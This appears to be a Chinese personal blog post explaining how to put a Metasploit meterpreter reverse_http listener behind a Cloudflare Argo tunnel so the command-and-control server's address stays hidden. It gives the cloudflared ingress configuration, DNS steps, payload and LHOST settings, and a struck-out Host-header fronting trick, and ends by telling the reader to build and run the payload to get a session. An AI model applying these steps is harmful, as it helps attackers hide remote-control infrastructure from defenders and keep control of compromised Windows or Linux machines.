---
title: msf http使用cloudflare argo上线
date: 2021-11-21 13:34:14
author: Tokisaki Galaxy
excerpt: msf http使用cloudflare argo隧道上线，并隐藏C2地址
tags:
 - Linux
 - cloudflare
 - Argo
 - metasploit
 - 网络安全
categories: 踩坑记录
---

为了直观展示，本文使用[VIPER图形化界面](https://github.com/FunnyWolf/Viper/)。

## 配置Argo隧道方法

**下面教程是建立在您已经有一条隧道，有一个配置文件的基础上的，如果您还没有，请参阅[使用Cloudflare Argo隐藏VIPER后台](https://tokisaki.top/blog/viper-via-cloudflare-argo/)。**

在config.yml后面添上
如果已经有了那路径是`/etc/cloudflared/config.yml`。

新加如下几行

```yml
#tp
tunnel: xxxxxxxxx
credentials-file: /root/.cloudflared/xxxxxxxxx.json

ingress:
  - hostname: vip.example.top
    service: http://127.0.0.1:60000
    #这里开始
  - hostname: tp.example.top
    service: http://127.0.0.1:2095 #这里端口要和下面msf监听设置成一样的，只要没被占用就行
    #这里结束
  - service: http_status:404
```

最后重启服务，应用配置文件。

```bash
sudo systemctl restart cloudflared
```

在[cloudflare dashboard](https://dash.cloudflare.com)的dns面板里面，将tp.example.top的记录设置为与vip.example.top的记录一样
![就像这样](https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/post/meterpreter-via-cloudflare-argo/1.png)

然后通过浏览器访问 `http://tp.example.top:2095` ，应该会有这样的提示。
![提示404 Not found](https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/post/meterpreter-via-cloudflare-argo/2.png)

## 通过http上线

因为cloudflare在国内访问不太行，最好用stageless。

载荷选择`windows/meterpreter_reverse_http`。

设置LHOST为`tp.example.top`
端口和argo隧道里设的一样就行。

~~设置`LHOST`为`104.19.0.100`，这是Cloudflare的一个香港节点，大陆访问速度相当快，如果你有更快的就直接替代好啦。
下拉找到`HttpHostHeader`，里面填`tp.example.top`这样既可以用较快的节点访问C2服务器，又不至于太暴露C2域名。~~

如果用HostHeader伪装C2域名，理论上来讲没问题，但是实操会导致上线但无法操作，可能跟缓存有关，下周回来试试。

![设置完之后大概这样](https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/post/meterpreter-via-cloudflare-argo/3.png)

生成PE/ELF文件，然后执行。就会产生一个Session。

![最终成果](https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/post/meterpreter-via-cloudflare-argo/4.png)
